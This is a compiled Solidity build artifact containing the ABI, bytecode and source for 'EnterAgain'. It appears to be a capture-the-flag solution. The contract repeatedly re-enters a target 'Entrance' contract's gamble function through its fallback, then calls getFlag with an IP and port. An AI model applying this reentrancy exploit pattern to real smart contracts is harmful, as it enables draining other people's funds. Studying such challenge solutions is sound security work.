{
  "contractName": "EnterAgain",
  "abi": [
    {
      "inputs": [
        {
          "name": "_a",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "enter",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000805534801561001457600080fd5b506040516020806104b88339810180604052810190808051906020019092919050505080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610430806100886000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063e97dcb6214610119575b34801561004d57600080fd5b506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050600080815480929190600101919050555060286000541015610112578073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100f557600080fd5b505af1158015610109573d6000803e3d6000fd5b50505050610116565b6000ff5b50005b34801561012557600080fd5b5061012e610130565b005b600080439150600061014c6007846103df90919063ffffffff16565b1415156101c1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f77726f6e6720626c6f636b206e756d626572000000000000000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663a59f3e0c60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561025657600080fd5b505af115801561026a573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156102d257600080fd5b505af11580156102e6573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663c19d1c256040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018080602001806020018381038352600e8152602001807f3135312e3231372e3233392e3738000000000000000000000000000000000000815250602001838103825260048152602001807f363635360000000000000000000000000000000000000000000000000000000081525060200192505050600060405180830381600087803b1580156103c357600080fd5b505af11580156103d7573d6000803e3d6000fd5b505050505050565b60008082141515156103f057600080fd5b81838115156103fb57fe5b069050929150505600a165627a7a7230582081b26068f84e37a4d1edc8c6cee21063b04c0191567b314c9c76bd5aea2915920029",
  "source": "pragma solidity >=0.4.21 <0.6.0;\n\nimport \"./entrance.sol\";\nimport \"./SafeMath.sol\";\n\ncontract EnterAgain {\n    using SafeMath for *;\n\n    uint256 counter = 0;\n    address a;\n\n    constructor(address _a) {\n        a = _a;\n    }\n\n    function enter() {\n        uint b = block.number;\n        require((b).mod(7) == 0, \"wrong block number\");\n        Entrance entrance = Entrance(a);\n        entrance.enter(1);\n        entrance.gamble();\n        entrance.getFlag(\"151.217.239.78\", \"6656\");\n    }\n\n    function() {\n        Entrance entrance = Entrance(a);\n        counter++;\n        if(counter < 40) {\n            entrance.gamble();\n        } else {\n            selfdestruct(0x0); \n        }\n    }\n}\n",
  "sourcePath": "/Users/linkeex/Projects/ccc/solidity/contracts/enteragain.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-12-29T23:47:55.045Z"
}